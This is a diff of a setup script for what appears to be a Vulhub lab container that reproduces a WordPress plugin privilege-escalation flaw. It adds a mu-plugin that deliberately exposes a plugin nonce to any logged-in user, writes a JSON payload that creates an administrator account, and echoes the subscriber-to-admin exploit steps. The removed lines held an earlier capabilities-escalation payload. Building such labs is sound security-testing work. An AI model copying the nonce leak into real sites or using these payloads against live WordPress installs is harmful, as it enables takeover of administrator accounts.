@@ -2,12 +2,12 @@
 set -Eeuo pipefail
 
 WORDPRESS_PATH="/var/www/html"
-WP_URL="${WORDPRESS_URL:-http://localhost:8120}"
+WP_URL="${WORDPRESS_URL:-http://localhost:8119}"
 WP_TITLE="${WORDPRESS_TITLE:-Vulhub Test}"
 WP_ADMIN_USER="${WORDPRESS_ADMIN_USER:-admin}"
 WP_ADMIN_PASSWORD="${WORDPRESS_ADMIN_PASSWORD:-admin}"
 WP_ADMIN_EMAIL="${WORDPRESS_ADMIN_EMAIL:-admin@example.com}"
-WP_PLUGIN_SLUG="${WORDPRESS_PLUGIN_SLUG:-import-users-from-csv-with-meta}"
+WP_PLUGIN_SLUG="${WORDPRESS_PLUGIN_SLUG:-expand-maker}"
 DEBUG_MODE="${DEBUG_MODE:-false}"
 
 /usr/local/bin/docker-entrypoint-original.sh "$@" &
@@ -58,62 +58,65 @@ fi
 wp option update siteurl "$WP_URL" --allow-root >/dev/null
 wp option update home "$WP_URL" --allow-root >/dev/null
 wp option update permalink_structure '/%postname%/' --allow-root >/dev/null
-
-# --- Multisite setup ---
-echo "Converting to WordPress Multisite (subdirectory mode)..."
-wp core multisite-convert --title="Vulhub Network" --allow-root 2>/dev/null || true
-
-# Write multisite .htaccess rules
-cat > "$WORDPRESS_PATH/.htaccess" << 'HTACCESS'
-RewriteEngine On
-RewriteBase /
-RewriteRule ^index\.php$ - [L]
-
-# Multisite subdirectory rules
-RewriteRule ^([_0-9a-zA-Z-]+/)?wp-admin$ $1wp-admin/ [R=301,L]
-
-RewriteCond %{REQUEST_FILENAME} -f [OR]
-RewriteCond %{REQUEST_FILENAME} -d
-RewriteRule ^ - [L]
-RewriteRule ^([_0-9a-zA-Z-]+/)?(wp-(content|admin|includes).*) $2 [L]
-RewriteRule ^([_0-9a-zA-Z-]+/)?(.*\.php)$ $2 [L]
-RewriteRule . index.php [L]
-HTACCESS
-
 wp rewrite flush --allow-root >/dev/null || true
 
-# Create subsite (blog ID 2) — this is the target site for privilege escalation
-echo "Creating subsite..."
-wp site create --slug=subsite --title="Subsite 2" --email="$WP_ADMIN_EMAIL" --allow-root 2>/dev/null || \
-    echo "Note: subsite may already exist"
-
-# Activate plugin network-wide so it's available on all sites
+# Activate plugin (bundled in image)
 if wp plugin list --allow-root --field=name | grep -qx "$WP_PLUGIN_SLUG"; then
-    wp plugin activate "$WP_PLUGIN_SLUG" --network --allow-root || \
     wp plugin activate "$WP_PLUGIN_SLUG" --allow-root || true
+else
+    echo "WARNING: Plugin $WP_PLUGIN_SLUG not found" >&2
 fi
 
-# Simulate prerequisite: admin imports CSV containing wp_2_capabilities column.
-# This stores the column header in acui_columns option (plugin tracks imported columns)
-# and enables "Show fields in profile?" so subscribers see the field in their profile.
-wp eval '
-$columns = ["user_login", "user_email", "user_pass", "role", "wp_2_capabilities"];
-update_option("acui_columns", $columns);
-update_option("acui_show_profile_fields", true);
-echo "acui_columns set: " . implode(", ", $columns) . "\n";
-echo "acui_show_profile_fields: true\n";
-' --allow-root 2>/dev/null || echo "Note: acui option setup may need verification"
-
-# Create subscriber user for privilege escalation attack
+# Create a low-privilege user (subscriber) who will perform the attack
 echo "Creating subscriber user..."
 wp user create subscriber subscriber@example.com \
     --role=subscriber --user_pass=subscriber --allow-root 2>/dev/null || true
 
-echo "Setup complete. CVE-2026-7641 environment ready at $WP_URL"
+# Install mu-plugin that exposes YrmNonce for authenticated users via REST API.
+# Subscribers get 403 on wp-admin pages so the nonce can't be extracted from there.
+mkdir -p "$WORDPRESS_PATH/wp-content/mu-plugins"
+cat > "$WORDPRESS_PATH/wp-content/mu-plugins/vulhub-yrm-nonce.php" << 'MUPLUGIN'
+<?php
+// Expose YrmNonce for any logged-in user via admin-ajax.php.
+// Subscribers get 403 on plugin admin pages, so the nonce can't be extracted from the UI.
+add_action('wp_ajax_vulhub_get_yrm_nonce', function() {
+    wp_send_json_success(['nonce' => wp_create_nonce('YrmNonce')]);
+});
+MUPLUGIN
+chown www-data:www-data "$WORDPRESS_PATH/wp-content/mu-plugins/vulhub-yrm-nonce.php"
+
+# Create exploit payload JSON: inserts a new user (ID 9999) with administrator capabilities.
+# wp_remote_get fetches this from 127.0.0.1 (container-internal Apache on port 80).
+echo "Creating YRM exploit payload..."
+wp eval '
+$hash = wp_hash_password("Admin1234!");
+$payload = json_encode([
+    "users" => [[
+        "ID"              => 9999,
+        "user_login"      => "yrmpwnadmin",
+        "user_pass"       => $hash,
+        "user_email"      => "yrmpwnadmin@example.com",
+        "user_registered" => "2024-01-01 00:00:00",
+        "display_name"    => "yrmpwnadmin",
+        "user_status"     => "0",
+        "user_nicename"   => "yrmpwnadmin",
+    ]],
+    "usermeta" => [[
+        "user_id"    => 9999,
+        "meta_key"   => "wp_capabilities",
+        "meta_value" => "a:1:{s:13:\"administrator\";b:1;}",
+    ]],
+]);
+$path = "/var/www/html/wp-content/uploads/yrm-exploit.json";
+file_put_contents($path, $payload);
+chown($path, "www-data");
+echo "Exploit payload written: " . strlen($payload) . " bytes\n";
+' --allow-root 2>/dev/null || echo "WARNING: exploit payload creation failed"
+
+echo "Setup complete. CVE-2026-7467 environment ready at $WP_URL"
 echo "Admin:      $WP_ADMIN_USER / $WP_ADMIN_PASSWORD"
 echo "Subscriber: subscriber / subscriber"
-echo "Subsite:    $WP_URL/subsite/"
-echo "Exploit: Login as subscriber, POST /wp-admin/profile.php with wp_2_capabilities=a:1:{s:13:\"administrator\";b:1;}"
+echo "Exploit: Login as subscriber, POST to importData AJAX endpoint with crafted user rows"
 
 trap - EXIT
 wait "$APACHE_PID"
